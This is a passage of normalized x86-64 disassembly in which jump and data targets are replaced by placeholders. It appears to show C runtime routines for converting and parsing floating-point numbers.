xor rcx rsp
call sub_180006220
add rsp 0x88
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_180013cf0
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_18000ba70
call rax
call sub_18000baa0
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_18000ba70
add rsp 0x28
retn
sub_180013d44
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180008e40
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180008e40
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_180014310
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180008e40
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180008e40
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_1800148dc
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r13 [ rbp + 0x7f ]
xor ebx ebx
mov [ rbp - 0x71 ] r9d
lea r9d [ rbx + 0x1 ]
mov [ rbp - 0x59 ] rcx
mov [ rbp - 0x69 ] rdx
lea r10 [ rbp - 0x21 ]
mov [ rbp - 0x6d ] bx
mov edi ebx
mov [ rbp - 0x75 ] r9d
mov r14d ebx
mov [ rbp - 0x79 ] ebx
mov r15d ebx
mov esi ebx
mov r12d ebx
mov ecx ebx
test r13 r13
jne r-xdata
mov r11 r8
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
xor eax eax
jmp r-xdata
add r8 r9
jmp r-xdata
cmp al 0x9
je r-xdata
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0xf0 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov al [ r8 ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov dl [ r8 ]
add r8 r9
cmp ecx 0x5
jg r-xdata
mov r9d ecx
sub r9d 0x6
je r-xdata
je r-xdata
lea eax [ rdx - 0x31 ]
lea r11 [ r8 - 0x2 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
sub dl 0x30
mov [ rbp - 0x79 ] r9d
cmp dl 0x9
ja r-xdata
mov r9d ecx
test ecx ecx
je r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x2b
je r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r8 r11
jmp r-xdata
mov ecx 0x4
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
mov r9d 0x1
mov ecx 0x7
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
mov r9d 0x1
mov r15d r9d
jmp r-xdata
dec r9d
je r-xdata
mov rax [ rbp - 0x69 ]
mov [ rax ] r8
test r14d r14d
je r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x3
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea eax [ rdx - 0x31 ]
mov r9d 0x1
mov r14d r9d
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
or [ rbp - 0x75 ] 0xffffffff
mov ecx 0x7
jmp r-xdata
jmp r-xdata
mov r8 r11
mov ecx 0x8
jmp r-xdata
cmp dl 0x30
je r-xdata
mov r9d 0x1
mov r11b 0x30
mov r15d r9d
jmp r-xdata
cmp r9d 0x2
jne r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x4
cmp edi 0x18
jbe r-xdata
mov ecx 0x5
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea ecx [ r9 + 0x2 ]
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
mov dl [ r8 ]
add r8 r9
sub dl 0x31
cmp dl 0x8
ja r-xdata
cmp dl r11b
jge r-xdata
cmp ecx 0xa
je r-xdata
cmp [ rbp + 0x77 ] ebx
je r-xdata
test edi edi
jne r-xdata
mov al [ rbp - 0xa ]
cmp al 0x5
jl r-xdata
mov ecx 0x2
mov [ rbp - 0x6d ] bx
jmp r-xdata
cmp dl 0x2d
je r-xdata
mov ecx 0x4
jmp r-xdata
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
mov r9d 0x1
mov al 0x30
mov r14d r9d
jmp r-xdata
dec r9d
jne r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov r9d 0x1
lea r11 [ r8 - 0x1 ]
cmp dl 0x2b
je r-xdata
sub r10 r9
cmp [ r10 ] bl
je r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
jmp r-xdata
sub r10 r9
mov edi 0x18
add r12d r9d
add al r9b
mov [ rbp - 0xa ] al
mov ecx 0x2
mov [ rbp - 0x6d ] 0x8000
jmp r-xdata
cmp dl 0x30
je r-xdata
sub r8 r9
mov ecx 0xb
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
cmp dl al
jge r-xdata
mov r9d 0x1
mov r14d r9d
mov [ rbp - 0x79 ] r9d
test edi edi
jne r-xdata
cmp dl r11b
jge r-xdata
lea ecx [ rsi + rsi * 4 ]
movsx eax dl
lea esi [ rax + rcx * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
mov ecx 0x7
jmp r-xdata
cmp dl 0x2d
jne r-xdata
dec edi
add r12d r9d
lea r8 [ rbp - 0x41 ]
lea rcx [ rbp - 0x21 ]
mov edx edi
call sub_180015bec
cmp [ rbp - 0x75 ] ebx
jge r-xdata
mov r8 [ rbp - 0x59 ]
or ax [ rbp - 0x6d ]
mov [ r8 + 0xa ] ax
mov eax ebx
mov [ r8 ] dx
mov [ r8 + 0x2 ] ecx
mov [ r8 + 0x6 ] edi
mov r9d 0x1
cmp dl 0x30
je r-xdata
cmp dl 0x39
jg r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
cmp dl 0x30
jge r-xdata
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov esi 0x1451
jmp r-xdata
mov dl [ r8 ]
add r8 r9
add esi r12d
test r15d r15d
jne r-xdata
neg esi
mov ecx r9d
jmp r-xdata
jmp r-xdata
cmp edi 0x19
jae r-xdata
cmp dl 0x2b
je r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x30
je r-xdata
mov dl [ r8 ]
add r8 r9
cmp [ rbp - 0x79 ] ebx
jne r-xdata
add esi [ rbp + 0x67 ]
cmp dl 0x43
jle r-xdata
add r12d r9d
sub dl al
add edi r9d
mov [ r10 ] dl
add r10 r9
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp edi 0x19
jae r-xdata
mov dl [ r8 ]
sub r12d r9d
add r8 r9
jmp r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ rbp + 0x6f ]
cmp dl 0x45
jle r-xdata
mov dl [ r8 ]
add r8 r9
mov dl [ r8 ]
add r8 r9
sub dl 0x30
add edi r9d
mov [ r10 ] dl
add r10 r9
sub r12d r9d
mov ecx ebx
movzx edx bx
mov eax 0x7fff
mov ebx 0x2
mov edi 0x80000000
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx 0x6
jmp r-xdata
sub dl 0x64
cmp dl r9b
ja r-xdata
mov edx ebx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x1
jmp r-xdata
lea r13 [ rw-data ]
sub r13 0x60
test esi esi
je r-xdata
mov eax [ rbp - 0x39 ]
movzx edx [ rbp - 0x41 ]
mov ecx [ rbp - 0x3f ]
mov edi [ rbp - 0x3b ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ rbp - 0x71 ] ebx
jne r-xdata
lea r13 [ rw-data ]
neg esi
sub r13 0x60
test esi esi
je r-xdata
mov [ rbp - 0x41 ] bx
mov edi 0x80000000
mov r10d 0x7fff
mov r12d 0x1
test esi esi
jne r-xdata
cdqe
mov r15d 0x8000
lea rcx [ rax + rax * 2 ]
lea rdx [ r13 + rcx * 4 ]
cmp [ rdx ] r15w
jb r-xdata
mov eax esi
add r13 0x54
sar esi 0x3
and eax 0x7
mov [ rbp - 0x71 ] esi
mov [ rbp - 0x61 ] r13
je r-xdata
movzx eax [ rdx + 0xa ]
movzx ecx [ rbp - 0x37 ]
mov [ rbp - 0x51 ] rbx
movzx r9d ax
and ax r10w
mov [ rbp - 0x49 ] ebx
xor r9w cx
and cx r10w
and r9w r15w
lea r8d [ rcx + rax ]
mov [ rbp - 0x75 ] r9w
cmp cx r10w
jae r-xdata
mov rcx [ rdx ]
mov eax [ rdx + 0x8 ]
lea rdx [ rbp - 0x31 ]
mov [ rbp - 0x31 ] rcx
shr rcx 0x10
mov [ rbp - 0x29 ] eax
sub ecx r12d
mov [ rbp - 0x2f ] ecx
neg r9w
cmp ax r10w
jae r-xdata
mov r11d 0xbffd
cmp r8w r11w
ja r-xdata
mov r9d 0x3fbf
cmp r8w r9w
ja r-xdata
test cx cx
jne r-xdata
mov [ rbp - 0x3d ] rbx
